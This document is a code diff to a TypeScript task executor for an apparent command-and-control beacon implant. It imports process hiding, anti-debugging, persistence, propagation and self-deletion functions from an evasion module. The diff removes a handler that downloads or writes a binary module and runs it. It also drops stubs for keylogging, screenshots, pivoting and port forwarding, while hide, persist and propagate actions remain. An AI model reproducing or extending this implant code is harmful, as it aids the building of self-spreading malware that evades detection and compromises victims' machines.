@@ -11,38 +11,31 @@
  *   ping        — connectivity probe; returns timestamp + beacon metadata
  *   sleep       — update beacon sleep interval (directive returned to main loop)
  *   kill        — self-terminate (directive returned to main loop)
- *   load-module — fetch or receive a binary module and execute it as a subprocess
  *
- * Stub kinds (to be implemented in later phases):
- *   upload, download, screenshot, keylog_start, keylog_stop,
- *   pivot, port_forward
+ * Any kind outside the shared public task catalog, including load-module, is
+ * rejected by the default branch and never reaches an execution handler.
  */
 
 import type { Task, TaskResult, BeaconConfig } from "../types.ts";
 import { createLogger }          from "../logger.ts";
-import { ModuleLoader }          from "../modules/ModuleLoader.ts";
 import {
   hideProcess,
   antiDebug,
   jitteredSleep,
-  selfDelete,
   getEvasionState,
   installPersistence,
   propagate,
   logEvasionAction,
 } from "../evasion/OpenHulud.ts";
 import type { PersistenceMethod } from "../evasion/OpenHulud.ts";
+import type { ExecutorDirective } from "./TaskDirective.ts";
+export type { ExecutorDirective } from "./TaskDirective.ts";
 
 const log = createLogger("TaskExecutor");
 
 // Some tasks require control-flow changes in the main loop (sleep interval
 // update, graceful shutdown). The executor returns these as directives
 // alongside the normal TaskResult.
-export type ExecutorDirective =
-  | { kind: "none" }
-  | { kind: "update_sleep"; seconds: number; jitter: number }
-  | { kind: "kill" };
-
 export interface ExecutionResult {
   result:    TaskResult;
   directive: ExecutorDirective;
@@ -77,20 +70,8 @@ export class TaskExecutor {
         case "kill":
           return this.executeKill(task, beaconId, startMs);
 
-        case "load-module":
-          return await this.executeLoadModule(task, beaconId, startMs);
-
         case "evasion":
           return await this.executeEvasion(task, beaconId, startMs);
-
-        case "upload":
-        case "download":
-        case "screenshot":
-        case "keylog_start":
-        case "keylog_stop":
-        case "pivot":
-        case "port_forward":
-          return this.notImplemented(task, beaconId, startMs);
 
         default:
           return this.unknownKind(task, beaconId, startMs);
@@ -221,61 +202,10 @@ export class TaskExecutor {
         taskId:      task.taskId,
         beaconId,
         success:     true,
-        output:      "Beacon terminating.",
+        output:      "Beacon termination scheduled after result acknowledgement.",
         completedAt: new Date().toISOString(),
       },
       directive: { kind: "kill" },
-    };
-  }
-
-  private async executeLoadModule(
-    task:     Task,
-    beaconId: string,
-    startMs:  number,
-  ): Promise<ExecutionResult> {
-    const name = typeof task.args["name"] === "string" ? task.args["name"].trim() : "";
-    if (!name) {
-      return this.failure(task, beaconId, startMs, "load-module: 'name' argument is required");
-    }
-
-    const serverUrl = typeof task.args["serverUrl"] === "string"
-      ? task.args["serverUrl"].trim() : "";
-    const payload   = typeof task.args["payload"]   === "string"
-      ? task.args["payload"].trim()   : "";
-
-    let binaryPath: string;
-
-    if (serverUrl) {
-      try {
-        binaryPath = await ModuleLoader.fetchModule(name, serverUrl, this.config.token, beaconId);
-      } catch (err) {
-        return this.failure(task, beaconId, startMs, (err as Error).message);
-      }
-    } else if (payload) {
-      try {
-        binaryPath = await ModuleLoader.writePayload(payload);
-      } catch (err) {
-        return this.failure(task, beaconId, startMs, (err as Error).message);
-      }
-    } else {
-      return this.failure(
-        task, beaconId, startMs,
-        "load-module: 'serverUrl' or 'payload' argument is required"
-      );
-    }
-
-    log.info(`load-module: running ${name}`);
-    const { success, output } = await ModuleLoader.runModule(binaryPath, process.pid);
-
-    return {
-      result: {
-        taskId:      task.taskId,
-        beaconId,
-        success,
-        output,
-        completedAt: new Date().toISOString(),
-      },
-      directive: { kind: "none" },
     };
   }
 
@@ -289,6 +219,7 @@ export class TaskExecutor {
       : "status";
 
     let payload: Record<string, unknown>;
+    let directive: ExecutorDirective = { kind: "none" };
 
     switch (action) {
       case "hide": {
@@ -309,8 +240,11 @@ export class TaskExecutor {
         break;
       }
       case "self_delete": {
-        const msg = await selfDelete();
-        payload = { action, result: msg };
+        payload = {
+          action,
+          result: "self-delete scheduled after result acknowledgement",
+        };
+        directive = { kind: "self_delete" };
         break;
       }
       case "status": {
@@ -361,7 +295,7 @@ export class TaskExecutor {
         output:      JSON.stringify(payload),
         completedAt: new Date().toISOString(),
       },
-      directive: { kind: "none" },
+      directive,
     };
   }
 
@@ -481,12 +415,6 @@ export class TaskExecutor {
       },
       directive: { kind: "none" },
     };
-  }
-
-  private notImplemented(
-    task: Task, beaconId: string, startMs: number
-  ): ExecutionResult {
-    return this.failure(task, beaconId, startMs, `Task kind '${task.kind}' is not yet implemented.`);
   }
 
   private unknownKind(
